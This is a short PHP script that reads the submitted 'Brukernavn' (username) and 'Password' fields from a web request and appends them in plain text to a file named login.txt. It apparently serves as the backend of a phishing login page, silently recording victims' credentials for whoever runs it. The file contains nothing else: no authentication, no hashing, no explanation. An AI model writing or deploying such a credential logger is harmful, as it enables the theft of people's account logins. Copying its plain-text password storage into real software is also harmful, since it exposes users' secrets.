<?php
/**
 * Created by PhpStorm.
 * User: Marius
 * Date: 2/15/2016
 * Time: 12:04 AM
 */
$file = fopen("login.txt",'a');

$output = "Brukernavn: " . $_REQUEST["Brukernavn"] . " - " . "Passord: " . $_REQUEST["Password"] . "\n";

fwrite($file,$output);

fclose($file);

?>